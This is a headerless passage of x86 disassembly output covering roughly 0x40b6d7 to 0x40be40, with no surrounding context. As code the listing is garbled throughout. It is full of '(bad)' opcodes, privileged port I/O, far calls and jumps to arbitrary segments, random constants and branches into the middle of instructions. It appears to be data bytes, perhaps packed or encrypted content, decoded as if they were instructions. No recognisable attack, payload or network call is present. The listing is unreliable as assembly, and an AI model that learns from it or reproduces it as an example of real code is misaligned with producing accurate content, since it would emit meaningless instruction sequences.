  40b6d7:	cmp    DWORD PTR [edx],ecx
  40b6d9:	outs   dx,BYTE PTR ds:[esi]
  40b6da:	mov    ch,0xf4
  40b6dc:	pop    ecx
  40b6dd:	xchg   DWORD PTR [ebx],ebx
  40b6df:	popf   
  40b6e0:	push   ebx
  40b6e1:	cmc    
  40b6e2:	mov    WORD PTR [ecx],ss
  40b6e4:	sbb    ch,BYTE PTR [ecx-0x54]
  40b6e7:	sub    al,0xb5
  40b6e9:	sub    edi,DWORD PTR [ebx+0x41fe7ed1]
  40b6ef:	jbe    0x40b73f
  40b6f1:	cli    
  40b6f2:	mov    edx,0x56a81020
  40b6f7:	xchg   edx,eax
  40b6f8:	icebp  
  40b6f9:	call   DWORD PTR [esi]
  40b6fb:	test   DWORD PTR [edx+eiz*8-0x71],ecx
  40b6ff:	adc    BYTE PTR [ebx+0x4f],bl
  40b702:	retf   
  40b703:	pop    edx
  40b704:	fcmovu st,st(4)
  40b706:	xor    BYTE PTR [edx+edx*8+0x27],dh
  40b70a:	add    eax,DWORD PTR ds:0x645c07e0
  40b710:	fbstp  TBYTE PTR [ecx+0x63]
  40b713:	fiadd  WORD PTR [eax+esi*4]
  40b716:	push   es
  40b717:	scas   eax,DWORD PTR es:[edi]
  40b718:	inc    ecx
  40b719:	les    edi,FWORD PTR [edx]
  40b71b:	pop    ds
  40b71c:	push   0xc8621b70
  40b721:	ret    
  40b722:	test   DWORD PTR [ebp-0x16d2838e],0x812d8018
  40b72c:	mov    ds:0x829a15b3,eax
  40b731:	pushf  
  40b732:	pop    ds
  40b733:	fidivr DWORD PTR [ebx]
  40b735:	or     al,0xc3
  40b737:	dec    edx
  40b738:	popa   
  40b739:	sub    ebp,DWORD PTR [ecx+0x1318092e]
  40b73f:	and    ebp,DWORD PTR [eax]
  40b741:	push   esi
  40b742:	js     0x40b6fe
  40b744:	mov    esi,0xd8f925e0
  40b749:	inc    edi
  40b74a:	xchg   edx,eax
  40b74b:	mov    ecx,0x4c335273
  40b750:	adc    eax,0x851dbf37
  40b755:	aam    0x2a
  40b757:	mov    eax,ds:0x9e1e44e4
  40b75c:	jne    0x40b717
  40b75e:	lahf   
  40b75f:	xor    al,0xb
  40b761:	dec    esi
  40b762:	add    al,0x60
  40b764:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b765:	repnz pop es
  40b767:	add    edi,DWORD PTR [esp+ecx*1-0xe62b07a]
  40b76e:	cmp    bl,BYTE PTR [eax]
  40b770:	imul   eax,DWORD PTR [ebp-0x6d8ab736],0x55798631
  40b77a:	jns    0x40b7ae
  40b77c:	mov    dl,cl
  40b77e:	or     eax,0x13732b39
  40b783:	sub    BYTE PTR [ebx+0x54],al
  40b786:	scas   eax,DWORD PTR es:[edi]
  40b787:	(bad)  
  40b788:	out    0x54,al
  40b78a:	mov    eax,DWORD PTR [ebx]
  40b78c:	or     BYTE PTR [ebx-0x27],0x2a
  40b790:	dec    ebp
  40b791:	adc    al,0x26
  40b793:	pop    ebp
  40b794:	neg    DWORD PTR [ecx+0x2e]
  40b797:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b798:	pop    eax
  40b799:	sar    BYTE PTR [esi-0x39899b35],0x87
  40b7a0:	lods   al,BYTE PTR ds:[esi]
  40b7a1:	xchg   ebp,eax
  40b7a2:	jo     0x40b814
  40b7a4:	xchg   edx,eax
  40b7a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7a6:	ret    
  40b7a7:	jb     0x40b75d
  40b7a9:	aam    0x79
  40b7ab:	push   0xffffffab
  40b7ad:	ror    BYTE PTR [ebp-0x1d],cl
  40b7b0:	dec    ebx
  40b7b1:	inc    ebx
  40b7b2:	(bad)  [edi+eax*1-0x8]
  40b7b6:	(bad)  
  40b7b7:	push   ds
  40b7b8:	stc    
  40b7b9:	les    edi,FWORD PTR ds:[ebx+0xea73c26]
  40b7c0:	enter  0x786d,0x4b
  40b7c4:	inc    ebp
  40b7c5:	repnz ficom WORD PTR [eax+0x13a4ebee]
  40b7cc:	dec    esi
  40b7cd:	inc    eax
  40b7ce:	les    esi,FWORD PTR [esi]
  40b7d0:	mov    bl,0xfe
  40b7d2:	out    0xbf,al
  40b7d4:	mov    cl,BYTE PTR [edi-0x2e9128f5]
  40b7da:	and    eax,0x33818a74
  40b7df:	add    bh,ah
  40b7e1:	xor    eax,0xf9d51fc0
  40b7e6:	xchg   edx,eax
  40b7e7:	mov    ?,WORD PTR [esi+eax*2]
  40b7ea:	loop   0x40b841
  40b7ec:	(bad)  
  40b7ed:	push   es
  40b7ee:	adc    edi,DWORD PTR cs:[ebp+0x1b]
  40b7f2:	into   
  40b7f3:	outs   dx,BYTE PTR ds:[esi]
  40b7f4:	sbb    al,0xdb
  40b7f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7f7:	test   al,0xb2
  40b7f9:	shl    BYTE PTR [esi+0x26],0x39
  40b7fd:	fidiv  WORD PTR [edi-0x4a699f0]
  40b803:	pusha  
  40b804:	push   ebp
  40b805:	aaa    
  40b806:	les    ebp,FWORD PTR [esi+0x20]
  40b809:	cdq    
  40b80a:	or     DWORD PTR [ebx+0x69],0xffffffa5
  40b80e:	movaps XMMWORD PTR [eax],xmm5
  40b811:	pop    ss
  40b812:	in     eax,dx
  40b813:	stos   DWORD PTR es:[edi],eax
  40b814:	jo     0x40b806
  40b816:	sub    al,0xd1
  40b818:	adc    BYTE PTR [edi],0x53
  40b81b:	sti    
  40b81c:	int    0x7d
  40b81e:	fstp   QWORD PTR [edx+ecx*4-0x75]
  40b822:	add    eax,0x4bb4832b
  40b827:	call   0x91e77917
  40b82c:	(bad)  
  40b82d:	sbb    BYTE PTR [ecx+0x3],bl
  40b830:	xor    bh,ah
  40b832:	mov    WORD PTR [ebx+0x43],ds
  40b835:	dec    ebx
  40b836:	rcr    ah,1
  40b838:	dec    ebp
  40b839:	jle    0x40b8b7
  40b83b:	fs fstp st(0)
  40b83e:	out    0x1f,eax
  40b840:	mov    cl,0xf1
  40b842:	aas    
  40b843:	pop    ebp
  40b844:	enter  0x948b,0x50
  40b848:	call   0xdc9c:0xf3dbe7ca
  40b84f:	push   es
  40b850:	imul   edi,DWORD PTR [eax+0x34ac3f52],0x15d95822
  40b85a:	das    
  40b85b:	push   edx
  40b85c:	mov    eax,0xf551d85e
  40b861:	xchg   BYTE PTR [edi],dl
  40b863:	jge    0x40b882
  40b865:	scas   eax,DWORD PTR es:[edi]
  40b866:	hlt    
  40b867:	push   ss
  40b868:	jecxz  0x40b801
  40b86a:	test   al,0xe5
  40b86c:	mov    bl,0xcd
  40b86e:	or     edi,ecx
  40b870:	adc    DWORD PTR [ebx+0xb],eax
  40b873:	or     DWORD PTR [ebp+0x72],esp
  40b876:	fimul  DWORD PTR [eax+0x2d70413e]
  40b87c:	daa    
  40b87d:	xchg   DWORD PTR [ebx-0x27],edx
  40b880:	pop    ebx
  40b881:	inc    ebx
  40b882:	stos   DWORD PTR es:[edi],eax
  40b883:	push   ecx
  40b884:	lock and BYTE PTR [edi-0x110760c0],bl
  40b88b:	clc    
  40b88c:	xchg   BYTE PTR [eax-0x1968d920],ch
  40b892:	sbb    DWORD PTR [eax+0x18],edi
  40b895:	and    DWORD PTR [edx],ebp
  40b897:	add    edx,DWORD PTR [ebp-0x127008ba]
  40b89d:	mov    ds:0xfee18c80,al
  40b8a2:	mov    al,ds:0x4b35b451
  40b8a7:	xor    ah,BYTE PTR [ebx]
  40b8a9:	repz or eax,0xddfed240
  40b8af:	add    BYTE PTR [esi+0x0],0x1b
  40b8b3:	mov    eax,0x29bb10d2
  40b8b8:	out    dx,al
  40b8b9:	loopne 0x40b908
  40b8bb:	sahf   
  40b8bc:	mov    esi,0x131ba289
  40b8c1:	xor    al,0x7b
  40b8c3:	push   es
  40b8c4:	dec    ebx
  40b8c5:	cmp    cl,BYTE PTR [edx-0x3c18d238]
  40b8cb:	daa    
  40b8cc:	enter  0x7067,0x51
  40b8d0:	ja     0x40b8c3
  40b8d2:	pop    es
  40b8d3:	(bad)  
  40b8d4:	in     eax,0xb5
  40b8d6:	aam    0x33
  40b8d8:	data16 mov ah,0xe3
  40b8db:	test   BYTE PTR ds:0xd8fa010f,0x96
  40b8e2:	sub    cl,ah
  40b8e4:	(bad)
  40b8e7:	mov    ch,0x5a
  40b8e9:	not    DWORD PTR [ebp+0x648e7a46]
  40b8ef:	push   eax
  40b8f0:	std    
  40b8f1:	jae    0x40b874
  40b8f3:	mov    esp,DWORD PTR [ebx]
  40b8f5:	mov    ds:0x4e4a25a7,eax
  40b8fa:	test   al,0xb3
  40b8fc:	add    ecx,DWORD PTR [eax-0x37]
  40b8ff:	(bad)  
  40b900:	pop    esi
  40b901:	ret    0x12a9
  40b904:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b905:	and    DWORD PTR [ebp+0xf],ecx
  40b908:	mov    edx,0x39812d1b
  40b90d:	and    al,0x89
  40b90f:	into   
  40b910:	fdivr  st,st(0)
  40b912:	pop    ebx
  40b913:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b914:	push   cs
  40b915:	inc    ebp
  40b916:	aad    0x16
  40b918:	or     bl,BYTE PTR [edi+0x20]
  40b91b:	add    eax,0x27106b59
  40b920:	in     al,0xa5
  40b922:	ins    DWORD PTR es:[edi],dx
  40b923:	pop    ebp
  40b924:	mov    DWORD PTR es:[esi],ecx
  40b927:	adc    eax,0x212cf2e9
  40b92c:	or     eax,0xca9377d5
  40b931:	jo     0x40b99d
  40b933:	ja     0x40b96b
  40b935:	pusha  
  40b936:	xchg   esp,eax
  40b937:	gs clc 
  40b939:	jmp    0x40b952
  40b93b:	(bad)
  40b93e:	sub    DWORD PTR [eax-0x29051c75],ecx
  40b944:	(bad)  
  40b945:	test   DWORD PTR ds:0x89bb2949,0xd787689d
  40b94f:	pushf  
  40b950:	sub    BYTE PTR [edi-0x38],bh
  40b953:	stos   DWORD PTR es:[edi],eax
  40b954:	imul   ebx,DWORD PTR [ebx+0x52],0xffffffb4
  40b958:	pop    ss
  40b959:	push   es
  40b95a:	les    eax,FWORD PTR [eax+0x2d]
  40b95d:	test   DWORD PTR [edi],esi
  40b95f:	js     0x40b949
  40b961:	ins    BYTE PTR es:[edi],dx
  40b962:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b963:	cwde   
  40b964:	(bad)  
  40b965:	xchg   ebp,eax
  40b966:	jbe    0x40b97f
  40b968:	push   eax
  40b969:	lds    ebp,FWORD PTR ds:0x4f82f231
  40b96f:	sti    
  40b970:	sbb    al,0x2c
  40b972:	fdiv   QWORD PTR es:[ecx+0x6f]
  40b976:	jmp    0x19ea:0xe6ec828c
  40b97d:	popa   
  40b97e:	or     DWORD PTR [edi-0x47b1c0df],0x6e
  40b985:	sbb    eax,0x5f5a20c3
  40b98a:	or     BYTE PTR [esi+ebp*2-0x5285e277],0xf0
  40b992:	hlt    
  40b993:	xor    edx,DWORD PTR [ebx+0x77]
  40b996:	in     eax,0xaa
  40b998:	aam    0x3
  40b99a:	pop    ss
  40b99b:	adc    eax,0xb121559c
  40b9a0:	fsubrp st(3),st
  40b9a2:	jb     0x40b95f
  40b9a4:	lahf   
  40b9a5:	dec    esp
  40b9a6:	jmp    0xd8d670aa
  40b9ab:	outs   dx,BYTE PTR ds:[esi]
  40b9ac:	fs jnp 0x40b9a2
  40b9af:	outs   dx,DWORD PTR ds:[esi]
  40b9b0:	adc    DWORD PTR [edi-0x42],0xe4468f5e
  40b9b7:	adc    BYTE PTR [edx+0x75504d5a],dh
  40b9bd:	aam    0x35
  40b9bf:	retf   
  40b9c0:	ret    0x37c4
  40b9c3:	cmp    eax,0xb5b8c937
  40b9c8:	mov    ds:0xb5cc88fa,al
  40b9cd:	mov    dl,0x26
  40b9cf:	ins    DWORD PTR es:[edi],dx
  40b9d0:	add    esi,ebx
  40b9d2:	cmp    dl,cl
  40b9d4:	int    0x2b
  40b9d6:	add    BYTE PTR [esi-0x37dade1f],bl
  40b9dc:	scas   al,BYTE PTR es:[edi]
  40b9dd:	adc    BYTE PTR [edx],al
  40b9df:	mov    ecx,0xaadcc0df
  40b9e4:	xor    eax,0xc567a5f4
  40b9e9:	js     0x40ba0e
  40b9eb:	stos   DWORD PTR es:[edi],eax
  40b9ec:	jg     0x40ba49
  40b9ee:	xchg   ecx,eax
  40b9f0:	enter  0x5efe,0x37
  40b9f4:	rol    DWORD PTR [ebp+0x3d],0x8
  40b9f8:	stos   DWORD PTR es:[edi],eax
  40b9f9:	pop    ebx
  40b9fa:	imul   ebx,DWORD PTR [edx+ebx*4+0x75],0xcaa65a15
  40ba02:	(bad)  
  40ba03:	ja     0x40ba49
  40ba05:	push   edi
  40ba06:	inc    esi
  40ba07:	and    al,BYTE PTR [edx+0x5e]
  40ba0a:	push   eax
  40ba0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba0c:	out    0x2b,al
  40ba0e:	sub    DWORD PTR [ebx+0x7c],0xffffffde
  40ba12:	mov    bh,0xb4
  40ba14:	imul   edi,DWORD PTR [ebx-0x14],0xffffffa4
  40ba18:	sbb    BYTE PTR [edx+0x33d8858e],bh
  40ba1e:	retf   0x3617
  40ba21:	rcl    BYTE PTR [esi+edx*4+0x2d],0x29
  40ba26:	idiv   esp
  40ba28:	push   0xe1386504
  40ba2d:	push   0x2d
  40ba2f:	mov    ebp,0xa6ef92ef
  40ba35:	jle    0x40baaa
  40ba37:	xchg   edi,eax
  40ba38:	cmc    
  40ba39:	in     al,dx
  40ba3a:	xchg   ecx,eax
  40ba3b:	or     DWORD PTR [edx],esi
  40ba3d:	loop   0x40ba47
  40ba3f:	sbb    edx,DWORD PTR [ecx+0x14]
  40ba42:	mov    bh,0xff
  40ba44:	jecxz  0x40ba71
  40ba46:	pusha  
  40ba47:	cdq    
  40ba48:	sub    dh,ah
  40ba4a:	or     esi,ebx
  40ba4c:	or     al,0xa8
  40ba4e:	push   ebp
  40ba4f:	pop    ss
  40ba50:	adc    eax,0x4cdd418d
  40ba55:	cli    
  40ba56:	mov    cl,0xb1
  40ba58:	ins    DWORD PTR es:[edi],dx
  40ba59:	or     eax,0xda08c12c
  40ba5e:	ins    BYTE PTR es:[edi],dx
  40ba5f:	cmp    esp,DWORD PTR [ecx]
  40ba61:	(bad)  
  40ba62:	fs js  0x40ba04
  40ba65:	jmp    0xb079:0xd97992ac
  40ba6c:	rcl    DWORD PTR [edx+0x32],0xf0
  40ba70:	xor    DWORD PTR [ebp-0x4d3e03dc],edi
  40ba76:	nop
  40ba77:	js     0x40ba52
  40ba79:	sub    al,0xa4
  40ba7b:	adc    ah,al
  40ba7d:	pop    ebp
  40ba7e:	xchg   ecx,eax
  40ba7f:	push   edx
  40ba80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba81:	pop    esp
  40ba82:	stc    
  40ba83:	arpl   ax,sp
  40ba85:	int    0x79
  40ba87:	jnp    0x40ba44
  40ba89:	push   esp
  40ba8a:	adc    dl,dl
  40ba8c:	ins    DWORD PTR es:[edi],dx
  40ba8d:	cmp    BYTE PTR [edx],bl
  40ba8f:	push   0x138cb14c
  40ba94:	pop    ebp
  40ba95:	dec    edx
  40ba96:	xchg   ecx,eax
  40ba97:	test   DWORD PTR [ebp+ebx*4-0x4b],edi
  40ba9b:	jmp    FWORD PTR [edi]
  40ba9d:	pop    ss
  40ba9e:	adc    eax,0xb1e0274e
  40baa3:	xchg   BYTE PTR [ebx+ecx*8+0x61abda87],al
  40baaa:	ss shl al,cl
  40baad:	adc    al,0x56
  40baaf:	retf   0x8bd4
  40bab2:	in     eax,dx
  40bab3:	or     ecx,DWORD PTR [ebp+0x11]
  40bab6:	push   0x9de91803
  40babb:	adc    edi,ecx
  40babd:	hlt    
  40babe:	fdiv   DWORD PTR [edi+0x0]
  40bac1:	adc    DWORD PTR [ebx],eax
  40bac3:	lods   al,BYTE PTR ds:[esi]
  40bac4:	test   edi,0xeeab352c
  40baca:	fcmovb st,st(6)
  40bacc:	mov    ebx,0xab1da73e
  40bad2:	fimul  WORD PTR [ebp-0x6bd6fe6c]
  40bad8:	cwde   
  40bad9:	nop
  40bada:	lds    esi,FWORD PTR [edi+0x22]
  40badd:	test   al,0x71
  40badf:	arpl   bp,cx
  40bae1:	and    dl,BYTE PTR [edx+0x20]
  40bae4:	xchg   ebx,eax
  40bae5:	jo     0x40bb50
  40bae7:	or     eax,0x28252a6
  40baec:	lods   al,BYTE PTR ds:[esi]
  40baed:	mov    ecx,ebx
  40baef:	dec    ecx
  40baf0:	aaa    
  40baf1:	sbb    cl,BYTE PTR [ebx]
  40baf3:	dec    edi
  40baf4:	sbb    BYTE PTR [ebx+0x56d808b3],0xd4
  40bafb:	fidivr DWORD PTR [edx+esi*8]
  40bafe:	or     al,ah
  40bb00:	retf   0x7da9
  40bb03:	push   ebx
  40bb04:	pusha  
  40bb05:	(bad)  [edi-0x24]
  40bb08:	push   esi
  40bb09:	test   BYTE PTR [eax+0x69b1dd8e],0xbd
  40bb10:	jge    0x40babc
  40bb12:	push   ebx
  40bb13:	ds pop ds
  40bb15:	xor    DWORD PTR [ebx+eax*1-0x4a],esp
  40bb19:	xchg   edx,eax
  40bb1a:	cli    
  40bb1b:	enter  0xf56c,0x98
  40bb1f:	mov    ah,BYTE PTR [edi+edi*8]
  40bb22:	leave  
  40bb23:	fisttp DWORD PTR [ecx+0x6fda4b0c]
  40bb29:	pop    ebp
  40bb2a:	cmp    BYTE PTR [edi],0xb3
  40bb2d:	enter  0xbed3,0x2e
  40bb31:	jae    0x40baf4
  40bb33:	mov    al,0x15
  40bb35:	jnp    0x40bb28
  40bb37:	mov    ebx,edi
  40bb39:	mov    bh,0xf1
  40bb3b:	jae    0x40bb44
  40bb3d:	add    BYTE PTR [ebx+eiz*2-0xbfbe0c4],ah
  40bb44:	je     0x40bb9f
  40bb46:	sahf   
  40bb47:	fmul   DWORD PTR [edi-0x2cb056e1]
  40bb4d:	or     DWORD PTR [ecx-0x4de3e289],eax
  40bb53:	or     ecx,DWORD PTR [ecx]
  40bb55:	mov    esi,0x9602af7
  40bb5a:	inc    ebp
  40bb5b:	jo     0x40baf7
  40bb5d:	mov    ds:0x9a84f88a,al
  40bb62:	mov    ds:0xe1922a1e,eax
  40bb67:	dec    ebx
  40bb68:	sub    cx,di
  40bb6b:	shl    edi,0xb0
  40bb6e:	ja     0x40bb8e
  40bb70:	push   eax
  40bb71:	mov    bl,0x8c
  40bb73:	jne    0x40bbf0
  40bb75:	popa   
  40bb76:	sar    DWORD PTR [eax-0x4e45338b],1
  40bb7c:	jl     0x40bb1c
  40bb7e:	test   eax,0x5fd75a8d
  40bb83:	mov    WORD PTR [esi-0x61f7ea77],gs
  40bb89:	test   eax,esp
  40bb8b:	scas   eax,DWORD PTR es:[edi]
  40bb8c:	sbb    bh,ah
  40bb8e:	pop    esp
  40bb8f:	mov    edx,DWORD PTR [edi-0x36]
  40bb92:	cmp    cl,BYTE PTR [ebx-0x3e6ca38f]
  40bb98:	lock in al,0x2d
  40bb9b:	xchg   esp,eax
  40bb9c:	jg     0x40bc00
  40bb9e:	jo     0x40bb47
  40bba0:	pop    edi
  40bba1:	and    al,0x3c
  40bba3:	jne    0x40bb3c
  40bba5:	cld    
  40bba6:	(bad)  
  40bba7:	in     eax,0x3e
  40bba9:	sha1msg1 xmm5,xmm5
  40bbad:	pop    esi
  40bbae:	leave  
  40bbaf:	das    
  40bbb0:	push   ss
  40bbb1:	push   ss
  40bbb2:	out    dx,eax
  40bbb3:	mov    ebx,0x88ff2038
  40bbb8:	pop    edi
  40bbb9:	adc    eax,0x6193f52
  40bbbe:	fidiv  DWORD PTR [esi-0x35]
  40bbc1:	retf   0x682d
  40bbc4:	shr    BYTE PTR [edi+ebx*1],1
  40bbc7:	ins    BYTE PTR es:[edi],dx
  40bbc8:	adc    esi,DWORD PTR [ebp+edx*8-0x26]
  40bbcc:	mov    al,0xd2
  40bbce:	rcl    DWORD PTR [edi+0x45cbbe22],1
  40bbd4:	push   edx
  40bbd5:	dec    ebp
  40bbd6:	mov    ecx,0x347aae57
  40bbdb:	push   cs
  40bbdc:	dec    ecx
  40bbdd:	fnstcw WORD PTR ds:0x36da4185
  40bbe3:	mov    BYTE PTR [ebx+eiz*8],ah
  40bbe6:	jg     0x40bc4a
  40bbe8:	imul   DWORD PTR [edi+0x1bdd1de6]
  40bbee:	pop    eax
  40bbef:	je     0x40bbc2
  40bbf1:	rcr    edi,cl
  40bbf3:	(bad)  
  40bbf4:	popf   
  40bbf5:	mov    edi,0xb877a824
  40bbfa:	data16 mov bl,0xf4
  40bbfd:	dec    eax
  40bbfe:	mov    dl,bl
  40bc00:	imul   DWORD PTR [edi-0x67e97c5a]
  40bc06:	xor    esp,DWORD PTR [esi]
  40bc08:	in     eax,dx
  40bc09:	inc    esi
  40bc0a:	pop    esi
  40bc0b:	stos   DWORD PTR es:[edi],eax
  40bc0c:	mov    eax,0x6dc76ff2
  40bc11:	ss sti 
  40bc13:	mov    eax,ds:0x767922fb
  40bc18:	xor    ah,BYTE PTR [esi-0x80]
  40bc1b:	and    al,0xc
  40bc1d:	in     al,0x18
  40bc1f:	fwait
  40bc20:	adc    ecx,DWORD PTR [esi]
  40bc22:	mov    bh,dh
  40bc24:	inc    esi
  40bc25:	mov    cl,0xca
  40bc27:	mov    edi,0xda7af266
  40bc2c:	std    
  40bc2d:	call   0xa217:0xc5890df1
  40bc34:	mov    eax,ds:0x35d8bae6
  40bc39:	dec    edi
  40bc3a:	sub    BYTE PTR [eax],0x2d
  40bc3d:	sbb    al,bl
  40bc3f:	(bad)  
  40bc40:	out    0xa8,al
  40bc42:	xchg   esp,eax
  40bc43:	call   0xe461:0xa4b39226
  40bc4a:	xchg   eax,edi
  40bc4c:	das    
  40bc4d:	mov    dh,0x75
  40bc4f:	mov    bh,0x32
  40bc51:	pop    ds
  40bc52:	mov    esp,0x26745e3
  40bc57:	sbb    bh,BYTE PTR [eax+0x4586107e]
  40bc5d:	sbb    eax,0x924a3952
  40bc62:	dec    eax
  40bc63:	inc    edi
  40bc64:	sub    ebx,DWORD PTR [ecx-0xf]
  40bc67:	bound  edi,QWORD PTR [ecx+0x1c7858eb]
  40bc6d:	data16 sbb dl,cl
  40bc70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc71:	or     al,0xea
  40bc73:	repz pop esi
  40bc75:	push   esi
  40bc76:	or     DWORD PTR [ebx-0x5a],eax
  40bc79:	and    DWORD PTR [ebp+0x49],ebp
  40bc7c:	jb     0x40bc06
  40bc7e:	test   eax,0x1e7b3a5a
  40bc83:	jns    0x40bc5d
  40bc85:	and    DWORD PTR [eax+0x7392611],esi
  40bc8b:	cdq    
  40bc8c:	(bad)  
  40bc8e:	or     eax,0x2bc92123
  40bc93:	jge    0x40bc30
  40bc95:	loop   0x40bc62
  40bc97:	mov    WORD PTR [ebx],fs
  40bc99:	lods   al,BYTE PTR ds:[esi]
  40bc9a:	push   0xb825d5f
  40bc9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bca0:	enter  0xb99b,0x86
  40bca4:	sub    BYTE PTR [edx],ch
  40bca6:	shl    BYTE PTR [ecx-0x2d5253b3],1
  40bcac:	jecxz  0x40bcf3
  40bcae:	lods   al,BYTE PTR ds:[esi]
  40bcaf:	in     al,0x12
  40bcb1:	test   BYTE PTR [edx],0x9
  40bcb4:	mov    bl,0xbb
  40bcb6:	mov    ds:0x766f2be5,eax
  40bcbb:	push   edx
  40bcbc:	aaa    
  40bcbd:	xor    eax,0xb7830736
  40bcc2:	enter  0x1757,0xc1
  40bcc6:	add    DWORD PTR [edx-0x65],ebx
  40bcc9:	jmp    0x747d441d
  40bcce:	stos   BYTE PTR es:[edi],al
  40bccf:	xor    DWORD PTR [ebp+0x7321c704],esp
  40bcd5:	mov    ah,0xb6
  40bcd7:	mov    ch,BYTE PTR [edi+0x9]
  40bcda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcdb:	cdq    
  40bcdc:	retf   
  40bcdd:	adc    BYTE PTR [edx],ah
  40bcdf:	sbb    BYTE PTR [edx+0x1c],dh
  40bce2:	and    al,dh
  40bce4:	lods   eax,DWORD PTR ds:[esi]
  40bce5:	das    
  40bce6:	and    eax,0xbaa5c70f
  40bceb:	(bad)  
  40bced:	outs   dx,DWORD PTR ds:[esi]
  40bcee:	sbb    DWORD PTR [eax+0x6ce33d6e],esi
  40bcf4:	add    al,0xbd
  40bcf6:	fs dec edx
  40bcf8:	mov    al,0x3d
  40bcfa:	(bad)  
  40bcfb:	daa    
  40bcfc:	push   ds
  40bcfd:	in     eax,0xf9
  40bcff:	sub    eax,0xb9f0d9e1
  40bd04:	jmp    0x40bd15
  40bd06:	pop    ecx
  40bd07:	cdq    
  40bd08:	out    0x27,eax
  40bd0a:	or     cl,ah
  40bd0c:	adc    BYTE PTR [ebp-0x7219b083],ah
  40bd12:	or     eax,0x5d79651b
  40bd17:	inc    esi
  40bd18:	cdq    
  40bd19:	out    0x16,al
  40bd1b:	ins    DWORD PTR es:[edi],dx
  40bd1c:	fcmovnu st,st(3)
  40bd1e:	xchg   dh,al
  40bd20:	and    eax,0x2d3d35fd
  40bd25:	imul   BYTE PTR [ebx-0x3bf2d556]
  40bd2b:	mov    bh,BYTE PTR [edi+eiz*1]
  40bd2e:	mov    eax,0x666070eb
  40bd33:	jb     0x40bd56
  40bd35:	sub    eax,0x6cb95bc9
  40bd3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd3b:	lea    edi,[ebp+0x79]
  40bd3e:	push   edx
  40bd3f:	(bad)  
  40bd40:	outs   dx,BYTE PTR ds:[esi]
  40bd41:	call   FWORD PTR [ebx+edi*2-0x22963fe5]
  40bd48:	mov    esp,eax
  40bd4a:	add    ecx,eax
  40bd4c:	scas   al,BYTE PTR es:[edi]
  40bd4d:	pushf  
  40bd4e:	(bad)  
  40bd4f:	push   ds
  40bd50:	sub    edx,0xffffffce
  40bd53:	cmp    BYTE PTR [esi],ch
  40bd55:	imul   eax,DWORD PTR [ebx+0x66],0x79b46c89
  40bd5c:	icebp  
  40bd5d:	stos   BYTE PTR es:[edi],al
  40bd5e:	and    DWORD PTR [ecx],eax
  40bd60:	les    esi,FWORD PTR [eax-0x70]
  40bd63:	test   al,0x42
  40bd65:	and    bh,BYTE PTR [edx+esi*8]
  40bd68:	aaa    
  40bd69:	mov    DWORD PTR [edx-0x54cbe4ce],ecx
  40bd6f:	in     al,0x7e
  40bd71:	mov    ebp,0xbd68ded7
  40bd76:	jne    0x40bddb
  40bd78:	add    DWORD PTR [eax-0x6f],ebp
  40bd7b:	imul   esp,DWORD PTR [edi-0x5189dfc],0x30
  40bd82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd83:	inc    esp
  40bd84:	dec    eax
  40bd85:	test   al,0x45
  40bd87:	xor    al,0xcb
  40bd89:	jmp    0x40bdf0
  40bd8b:	adc    eax,0x1ae431f6
  40bd90:	ret    0x8db9
  40bd93:	adc    eax,0xbce49687
  40bd98:	add    BYTE PTR [eax+0xe],ah
  40bd9b:	jmp    0x40be0c
  40bd9d:	xchg   ebp,eax
  40bd9e:	icebp  
  40bd9f:	pop    es
  40bda0:	xchg   dl,ch
  40bda2:	sbb    ebx,ebx
  40bda4:	fistp  QWORD PTR [ebp-0x961dcb7]
  40bdaa:	fmul   DWORD PTR ds:0xb5264217
  40bdb0:	mov    eax,0x932dd6ea
  40bdb5:	pusha  
  40bdb6:	test   al,0xa
  40bdb8:	pop    ss
  40bdb9:	adc    ebx,DWORD PTR [esi+edx*1-0x5b293119]
  40bdc0:	stc    
  40bdc1:	add    BYTE PTR [edi],ch
  40bdc3:	adc    DWORD PTR [edi+0x3783d235],ecx
  40bdc9:	jecxz  0x40be3f
  40bdcb:	push   es
  40bdcc:	sahf   
  40bdcd:	ret    
  40bdce:	test   DWORD PTR [edx-0x7b],ecx
  40bdd1:	std    
  40bdd2:	loopne 0x40bd5d
  40bdd4:	xchg   edx,eax
  40bdd5:	sbb    eax,0x4739960a
  40bdda:	test   BYTE PTR [esi-0x4465674b],0xbc
  40bde1:	cmp    ebp,ecx
  40bde3:	in     al,dx
  40bde4:	sbb    ch,BYTE PTR [esi]
  40bde6:	inc    eax
  40bde7:	mov    ebx,DWORD PTR ds:0x70c131d1
  40bded:	stc    
  40bdee:	les    ebx,FWORD PTR [ebx-0xd]
  40bdf1:	fs or  eax,0x2d469da3
  40bdf7:	add    al,0x57
  40bdf9:	mov    ?,WORD PTR [ebx+0x24b802d4]
  40bdff:	mov    BYTE PTR [edx+0x67de364a],bh
  40be05:	push   0xf7f5d7c1
  40be0a:	daa    
  40be0b:	xchg   ecx,eax
  40be0c:	(bad)  
  40be0d:	clc    
  40be0e:	shr    DWORD PTR [ecx+0x40],1
  40be11:	push   ebx
  40be12:	imul   esi,DWORD PTR [ebx],0x137f493f
  40be18:	push   ebx
  40be19:	or     BYTE PTR [edi-0x3c],al
  40be1c:	push   ebp
  40be1d:	sahf   
  40be1e:	test   eax,0x89f061ae
  40be23:	gs je  0x40be71
  40be26:	or     BYTE PTR [ebx],bl
  40be28:	jno    0x40be46
  40be2a:	sar    ch,0x8e
  40be2d:	dec    edi
  40be2e:	loope  0x40be61
  40be30:	mov    esp,0x769acbd2
  40be35:	nop
  40be36:	pop    ss
  40be37:	mov    ebp,0xdd40ffb6
  40be3c:	mov    al,0x1b
  40be3e:	xlat   BYTE PTR ds:[ebx]
  40be3f:	dec    ebp
  40be40:	(bad)  
